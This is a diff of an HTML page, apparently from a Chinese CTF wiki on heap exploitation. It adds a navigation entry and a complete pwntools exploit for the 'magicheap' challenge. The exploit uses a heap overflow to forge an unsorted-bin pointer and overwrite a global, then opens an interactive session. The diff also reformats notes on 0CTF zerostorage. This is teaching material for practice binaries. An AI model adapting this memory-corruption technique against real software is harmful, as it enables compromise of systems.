@@ -2068,6 +2068,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../introduction/" title="堆利用简介" class="md-nav__link">
+      堆利用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../heap_overview/" title="堆概述" class="md-nav__link">
       堆概述
     </a>
@@ -2945,6 +2957,58 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <li>触发漏洞即可。</li>
 </ol>
 <p>代码如下</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./magicheap&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">create_heap</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">edit_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">del_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="n">create_heap</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>  <span class="c1"># 0</span>
+<span class="n">create_heap</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>  <span class="c1"># 1</span>
+<span class="c1"># in order not to merge into top chunk</span>
+<span class="n">create_heap</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>  <span class="c1"># 2</span>
+
+<span class="n">del_heap</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x6020c0</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">bk</span> <span class="o">=</span> <span class="n">magic</span> <span class="o">-</span> <span class="mh">0x10</span>
+
+<span class="n">edit_heap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">))</span>
+<span class="n">create_heap</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>  <span class="c1">#trigger unsorted bin attack</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4869&quot;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
 <h2 id="2016-0ctf-zerostorage-">2016 0CTF zerostorage-待完成<a class="headerlink" href="#2016-0ctf-zerostorage-" title="Permanent link">&para;</a></h2>
 <p><strong>注：待进一步完成。</strong></p>
 <p>这里我们以 2016 年 0CTF 的zerostorage为例，进行介绍。</p>
@@ -2975,11 +3039,13 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <p>基本功能如下</p>
 <ol>
 <li>逐一查看 storage 数组，查找第一个未使用的元素，但是这个数组最大也就是32。</li>
-<li>读取storage 元素所需要存储内容的长度。</li>
+<li>读取storage 元素所需要存储内容的长度。<ul>
 <li>如果长度不大于0，直接退出；</li>
 <li>否则如果申请的字节数小于128，那就设置为128；</li>
 <li>否则，如果申请的字节数不大于4096，那就设置为对应的数值；</li>
 <li>否则，设置为4096。</li>
+</ul>
+</li>
 <li>使用 calloc 分配指定长度，注意 calloc 会初始化 chunk 为0。</li>
 <li>将 calloc 分配的内存地址与 bss 段的一个内存（初始时刻为一个随机数）进行抑或，得到一个新的内存地址。</li>
 <li>根据读取的storage的大小来读入内容。</li>
@@ -2990,11 +3056,13 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <ol>
 <li>如果没有任何存储，就直接返回。</li>
 <li>读入要更新的storage元素的id，如果id大于31或者目前处于不处于使用状态，说明不对，直接返回。</li>
-<li>读取<strong>更新后</strong>storage 元素所需要存储内容的长度。</li>
+<li>读取<strong>更新后</strong>storage 元素所需要存储内容的长度。<ul>
 <li>如果长度不大于0，直接退出；</li>
 <li>否则如果申请的字节数小于128，那就设置为128；</li>
 <li>否则，如果申请的字节数不大于4096，那就设置为对应的数值；</li>
 <li>否则，设置为4096。</li>
+</ul>
+</li>
 <li>根据 bss 段对应的随机数获取原先storage 存储内容的地址，</li>
 <li>如果更新后所需的长度不等于更新前的长度，就使用realloc为其重新分配内存。</li>
 <li>再次读取数据，同时更新storage 元素。</li>
